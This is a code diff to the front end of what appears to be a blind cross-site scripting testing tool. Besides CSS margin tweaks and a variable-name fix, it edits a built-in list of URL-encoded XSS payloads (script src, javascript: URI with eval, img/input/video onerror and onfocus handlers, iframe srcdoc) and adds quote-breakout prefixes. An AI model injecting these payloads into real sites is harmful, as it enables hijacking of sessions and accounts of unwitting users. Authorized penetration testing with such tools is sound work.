@@ -202,6 +202,8 @@
         .payload_author {
             cursor: pointer;
             text-decoration: underline;
+            margin-bottom: 0px;
+            margin-top: 0px;
         }
 
         .payload_author:hover {
@@ -505,13 +507,13 @@
             state.payloads = 1;
             var payloadsTable = document.getElementById('payloadsTable');
             var payloads = [
-                { title: 'Basic Payload', description: 'This is a basic payload', payload: '%3Cscript%20src%3D%27/script_domain/%27%3E%3C%2Fscript%3E', is_static: true },
+                { title: 'Basic Payload', description: 'This is a basic payload', payload: '%27%22%3Cscript%20src%3D%27/script_domain/%27%3E%3C%2Fscript%3E', is_static: true },
                 { title: 'Javascript URI', description: 'This is a payload that uses a javascript URI', payload: 'javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%5C%27script%5C%5C%27%29%3Ba.src%3D%5C%5C%27/script_domain/%5C%5C%27%3Bdocument.body.appendChild%28a%29%27%29', is_static: true },
                 // { title: 'IMG Error', description: 'Payload triggers on img error', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E' },
-                { title: 'IMG error', description: 'Payload triggers on img error', payload: '%22%3E%3Cimg%20src%3Dx%20id%3D/script_base64/%20onerror%3Deval%28atob%28this.id%29%29%3E', is_static: true },
-                { title: 'Input Tag Payload', description: 'HTML5 input-based payload', payload: '%22%3E%3Cinput%20onfocus%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%20autofocus%3E', is_static: true },
-                { title: 'Video Source Payload', description: 'Video Source payload', payload: '%22%3E%3Cvideo%3E%3Csource%20onerror%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%3E', is_static: true },
-                { title: 'Iframe with HTML entities', description: 'Iframe that uses HTML Entities', payload: '%22%3E%3Ciframe%20srcdoc%3D%22/script_htmlencode/%22%3E', is_static: true },
+                { title: 'IMG error', description: 'Payload triggers on img error', payload: '%27%22%3E%3Cimg%20src%3Dx%20id%3D/script_base64/%20onerror%3Deval%28atob%28this.id%29%29%3E', is_static: true },
+                { title: 'Input Tag Payload', description: 'HTML5 input-based payload', payload: '%27%22%3E%3Cinput%20onfocus%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%20autofocus%3E', is_static: true },
+                { title: 'Video Source Payload', description: 'Video Source payload', payload: '%27%22%3E%3Cvideo%3E%3Csource%20onerror%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%3E', is_static: true },
+                { title: 'Iframe with HTML entities', description: 'Iframe that uses HTML Entities', payload: '%27%22%3E%3Ciframe%20srcdoc%3D%22/script_htmlencode/%22%3E', is_static: true },
                 { title: 'Jquery Payload', description: 'Payload exclusive to jquery', payload: '%3Cscript%3E%24.getScript%28%22/script_domain/%22%29%3C%2Fscript%3E', is_static: true },
                 // { title: 'CSP Bypass', author: '@BRuteLogic', author_link: 'https://twitter.com/BRuteLogic', description: 'Payload against "script-src"', payload: '%3CIframe%20SrcDoc%3D%0A%22%3CScript%20Src%3D/script_domain/%3E%3C%2FScript%3E%22%3E'}
             ];
@@ -717,7 +719,7 @@
 
             payload_import_export_form.addEventListener('submit', function(event) {
                 event.preventDefault();
-                var status_div = make_div('status', payload_import_export);
+                var status_div = make_div('status', payload_import_export_form);
                 var status = make_element('p', '', status_div);
                 var input = payload_import_export_form.getElementsByTagName('textarea')[0];
                 fetch('/api/v1/user_payload_importer', {
